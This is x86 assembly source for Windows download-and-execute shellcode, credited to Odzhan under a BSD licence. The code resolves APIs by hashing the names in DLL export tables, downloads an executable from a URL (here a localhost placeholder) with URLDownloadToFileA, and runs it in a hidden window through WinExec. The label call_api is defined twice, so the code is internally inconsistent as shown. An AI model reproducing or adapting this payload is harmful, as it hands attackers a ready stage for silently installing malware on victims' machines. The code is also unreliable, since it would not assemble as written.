;
;  Copyright © 2017 Odzhan. All Rights Reserved.
;
;  Redistribution and use in source and binary forms, with or without
;  modification, are permitted provided that the following conditions are
;  met:
;
;  1. Redistributions of source code must retain the above copyright
;  notice, this list of conditions and the following disclaimer.
;
;  2. Redistributions in binary form must reproduce the above copyright
;  notice, this list of conditions and the following disclaimer in the
;  documentation and/or other materials provided with the distribution.
;
;  3. The name of the author may not be used to endorse or promote products
;  derived from this software without specific prior written permission.
;
;  THIS SOFTWARE IS PROVIDED BY AUTHORS "AS IS" AND ANY EXPRESS OR
;  IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE IMPLIED
;  WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE ARE
;  DISCLAIMED. IN NO EVENT SHALL THE AUTHOR BE LIABLE FOR ANY DIRECT,
;  INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL DAMAGES
;  (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
;  SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION)
;  HOWEVER CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT,
;  STRICT LIABILITY, OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN
;  ANY WAY OUT OF THE USE OF THIS SOFTWARE, EVEN IF ADVISED OF THE
;  POSSIBILITY OF SUCH DAMAGE.
;
    bits 32

    pushad  
    jmp    ld_params
call_api:
    
      pop edi                                     ; offset @cmd_start
      xor eax,eax                                 ; eax = 0
      cdq                                         ; edx = 0
      ; ********************************************************************
      push eax                                    ; exit code  = 0
      ; ********************************************************************
      push eax                                    ; SW_HIDE
      mov dl,(@cmd_end-@cmd_start)-1              ; this allows command up to 255 bytes
      push edi                                    ; file name to execute
      ; ********************************************************************
      push eax                                    ; callback routine URLDownLoadToFileA
      push eax                                    ; reserved, must be zero
      push edi                                    ; file name to save as
      add edi,edx                                 ; get offset of @url_start-1
      stosb                                       ; zero tail end
      mov dl,(@url_end-@url_start)-1              ; limit of 255 bytes for url
      push edi                                    ; url to download file from
      push eax                                    ; interface
      add edi,edx                                 ; get offset of @urlmon-1
      stosb                                       ; zero tail end of url
      ; *********************************************************************
load_modules:
      push edi                   ; save current offset to hashes
      push 30h
      pop ecx
      mov eax,fs:[ecx]           ; PEB base address
      mov eax,[eax+0ch]          ; PEB_LDR_DATA LoaderData
      mov ebp,[eax+1ch]          ; LIST_ENTRY InMemoryOrderModuleList
scan_dll:
      mov ebx,[ebp+8]            ; DllBase
      mov ebp,[ebp]              ; Flink
      push ebp                   ; save

      mov eax,[ebx+3ch]
      mov eax,[ebx+eax+78h]	 ; IMAGE_DIRECTORY_ENTRY_EXPORT
      lea esi,[ebx+eax+18h]	 ; offset IMAGE_EXPORT_DIRECTORY.NumberOfNames
      lodsd
      xchg eax,ecx               ; ecx = NumberOfNames
      
      lodsd
      add eax,ebx                ; AddressOfFunctions
      push eax

      lodsd
      lea edi,[eax+ebx]          ; AddressOfNames

      lodsd
      lea ebp,[eax+ebx]		 ; ebp = AddressOfNameOrdinals
load_api:
      mov esi,[edi+4*ecx-4]
      add esi,ebx
      xor eax,eax
      cdq
hash_api:
      lodsb
      add edx,eax
      rol edx,ROL_CONSTANT
      dec eax
      jns hash_api

      mov esi,[esp+8]                             ; get api hashes
      cmp dx,word ptr[esi]                        ; found a match?
      je call_api

      loop load_api
      pop eax                                     ; check
      pop ebp                                     ;
      jmp scan_dll
call_api:
      pop eax
      movzx edx,word ptr [ebp+2*ecx-2]
      add ebx,[eax+4*edx]
      pop ebp                                     ; modules
      pop edi                                     ; api hashes
      call ebx                                    ; call api
      stosw                                       ; advance 2 bytes to next hash
      jmp load_modules                             ; do another, just keep going until ExitProcess is reached.
      ; *************************
init_params:
    pop    esi
    xor    eax, eax
    cdq
    push   edx       ; hidden window
    lodsb            ; length
    xchg   eax, ebx
    push   esi       ; file to execute
    push   2
    dec    eax
    add    esi, ebx
    push   edx       ; callback routine    
    push   edx       ; reserved   

    ; HMODULE WINAPI LoadLibrary(lpFileName);
    ; HRESULT URLDownloadToFile(pCaller, szURL, szFileName, dwReserved, lpfnCB);
    ; UINT WINAPI WinExec(lpCmdLine,uCmdShow);
call_loop:    
    lodsd
    call   call_api
    jmp    call_loop

    ; dll to load, keep 8 bytes
    db "urlmon", 0xFF, 0xFF
    hashapi <LoadLibraryA>
    
    ; name of file on disk
    db "filename.exe", 0xFF
    
    ; url of file to download
    db "http://127.0.0.1/filename.exe", 0xFF
    hashapi <URLDownloadToFileA>
    hashapi <WinExec>
